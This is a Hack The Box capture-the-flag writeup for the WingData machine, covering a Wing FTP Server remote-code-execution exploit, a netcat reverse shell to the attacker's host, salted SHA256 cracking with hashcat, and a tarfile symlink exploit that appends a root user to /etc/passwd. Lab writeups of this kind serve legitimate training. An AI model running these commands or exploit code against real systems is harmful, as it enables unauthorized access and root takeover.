# Hack The Box — WingData (Writeup)
[Here are the notes I took while solving](./Walkthrough)

## Recon

I started with a full TCP scan and version detection:

```bash
nmap -p- -sV 10.129.7.123
```

Output:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 had a basic homepage and nothing immediately useful, but there was a **Client Portal** button. Clicking it redirected me to:

- `http://ftp.wingdata.htb`

The login page was already a big hint because it straight up disclosed the software and version:

> **FTP server software powered by Wing FTP Server v7.4.3**

---

## Initial Access — Wing FTP Server v7.4.3 RCE (CVE-2025-47812)

A quick search led me to a PoC that claimed RCE works even as `anonymous`:

- PoC: https://github.com/4m3rr0r/CVE-2025-47812-poc/tree/main

The vulnerability chain (as explained by the research/PoC) is basically:

- **NULL byte truncation** in `c_CheckUser()` because it uses `strlen()` on the username → `anonymous%00...` authenticates as `anonymous`.
- Session creation stores the **full raw username** into the session variable: `rawset(_SESSION, "username", username)` (unsanitized).
- Session files are **Lua scripts**, so if I inject Lua code after the NULL byte, it gets written into the session file → **Lua code injection**.
- When an authenticated page is accessed (like `/dir.html`), `SessionModule.load()` executes the session file via `loadfile(filepath)` and then `f()` → **RCE**.

I used the PoC to pop a reverse shell:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c 'nc 10.10.15.32 9333 -e /bin/sh'
```

On my listener, I landed as the `wingftp` user. Quick environment check:

```bash
env
```

Result (key bits):

```text
USER=wingftp
HOME=/opt/wingftp
SHELL=/bin/bash
PWD=/tmp
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

At this stage I uploaded a more comfortable reverse shell (revssh) so I could work without constantly worrying about stability.

---

## Post-Exploitation — Looking Around Wing FTP Data

Once I had a stable shell, I started poking around where Wing FTP keeps its state:

```bash
cd /opt/wftpserver/Data
ls -la
```

Output:

```text
drwxr-x--- 4 wingftp wingftp  4096 Feb 15 06:05 .
drwxr-x--- 9 wingftp wingftp  4096 Feb 15 06:05 ..
drwxr-x--- 4 wingftp wingftp  4096 Feb  9 08:19 1
drwxr-x--- 2 wingftp wingftp  4096 Feb 15 06:05 _ADMINISTRATOR
-rw------- 1 wingftp wingftp 11264 Nov  2 11:11 bookmark_db
-rwxr-x--- 1 wingftp wingftp  2554 Nov  2 16:23 settings.xml
-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key
-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key
```

I noticed SSH keys in there and also had seen the username `wacky` referenced elsewhere (in the home directory). My first thought was: _maybe these Wing FTP SSH keys are useful for SSHing in_.

They weren’t. Dead end.

Next, I found a lot of SHA256-looking password hashes in the user XML files, which *felt* like the real intended path—but I was stuck for a while because I couldn’t crack them and I suspected I was using the wrong hashcat mode or format.

Then I had the “wait a second…” moment: Wing FTP might be **salting** the passwords.

---

## Creds Recovery — SHA256 + Salt (WingFTP)

Example user file:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Content:

```xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

So I searched for anything mentioning salt:

```bash
grep -ir 'salt' Data/
```

Result:

```text
Data/1/settings.xml:    <EnablePasswordSalting>1</EnablePasswordSalting>
Data/1/settings.xml:    <SaltingString>WingFTP</SaltingString>
```

That was the missing key. I prepared a hashcat input file using the `hash:salt` format:

```text
a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
```

Then ran hashcat:

```bash
hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt
```

It cracked the `wacky` password:

```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

SSH worked immediately:

```bash
ssh wacky@10.129.7.123
# password: !#7Blushing^*Bride5
```

The user flag was in `wacky`’s home directory.

---

## Privilege Escalation — Sudo Python Restore Script + tarfile Extraction Issue

From the `wacky` shell, I checked sudo rights:

```bash
sudo -l
```

Output:

```text
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

So: I can run a Python script as root, with arbitrary arguments. I initially looked for classic mistakes (unsafe `os.system`, path injection, user-controlled imports, etc.). Nothing obvious jumped out immediately, and I started thinking the intended vector might be in how it restores archives.

That’s when I remembered there are ongoing issues around Python’s `tarfile` extraction. I found this advisory:

- https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f  
- CVE: **CVE-2025-4517**

### My understanding of the bug (the “mental model” that made it click)

The scenario involves `tarfile.extractall(filter="data")`.

- `tarfile` tries to be safe by resolving symlinks using `os.path.realpath()` to prevent path traversal / escaping the extraction directory.
- `realpath()` only resolves safely up to `PATH_MAX`. If the resolved path would exceed it, it stops processing the remainder.
- Normally Python checks path lengths before calling `realpath()`, so you’d think you can’t trigger this.
- But you *can* cheat that check by constructing an input path made of **many chained symlinks** such that the *string length* stays `< PATH_MAX`, while the *expanded/real path* becomes `> PATH_MAX`.
- Once `realpath()` hits `PATH_MAX`, it leaves the rest unresolved → the symlink can remain effectively “partially unresolved” and still point outside → practical **arbitrary write** during extraction.

So the plan: craft a tar that, when extracted by the root-run restore script, escapes and overwrites something sensitive—`/etc/passwd` is the classic.

---

## Writing My Own Exploit (based on the PoC idea)

I decided to write my own exploit rather than pulling a ready-made one, using the original advisory/PoC logic as inspiration. My script was `scripts/exploit.py`.

My key adjustments:

### 1) Create a folder in a predictable writable place

I created a directory within the backups area so I had something stable to link to:

```python
os.system("mkdir /opt/backup_clients/backups/poc_created")
```

### 2) Point the symlink chain where I want

I set a `TarInfo` entry’s linkname to escape into that directory:

```python
e.linkname = linkpath + "/../../backups/poc_created"
```

### 3) Build a hardlink to `/etc/passwd` and then overwrite it

First, I add a hardlink entry that resolves to `/etc/passwd` via traversal:

```python
f = tarfile.TarInfo("flaglink")
f.type = tarfile.LNKTYPE
f.linkname =  "escape/../../../../etc/passwd"
tar.addfile(f)
```

Then I overwrite it by writing regular file content onto the same name. The idea is:

- Read the current `/etc/passwd`
- Append a new root-equivalent user line
- Write it back through extraction

Code:

```python
passwdfile = open("/etc/passwd", "r")
content = (passwdfile.read() + 'hacker:$1$salt$mMzyyPBTLVYDE9uhErBB0.:0:0:root:/root:/bin/bash').encode("utf-8")
passwdfile.close()

c = tarfile.TarInfo("flaglink")
c.type = tarfile.REGTYPE
c.size = len(content)
tar.addfile(c, fileobj=io.BytesIO(content))
```

Once extracted by the restore script (running as root via sudo), `/etc/passwd` gets the appended root user:

```text
hacker:$1$salt$mMzyyPBTLVYDE9uhErBB0.:0:0:root:/root:/bin/bash
```

From there, it’s the usual “become root” step (authenticate as `hacker`, or otherwise use the new entry depending on the environment and hashing/acceptance).

---

## Wrap-Up / Thoughts

Overall this felt like a “nice and easy” box, with two main moments where I lost time:

- Moving laterally to `wacky`: I wasted time because I didn’t notice the **salt** at first and was convinced I was formatting the hashes incorrectly for hashcat.
- The root privesc was actually fun: once I realized it was likely tar extraction related, the CVE trail was straightforward. There are probably ready-made exploits out there, but writing it myself was honestly simpler than expected and made the technique stick.

Good box, I enjoyed it.

---

## References

- CVE-2025-47812 PoC (Wing FTP Server v7.4.3 RCE):  
  https://github.com/4m3rr0r/CVE-2025-47812-poc/tree/main

- Python tarfile extractall filter issue (CVE-2025-4517):  
  https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f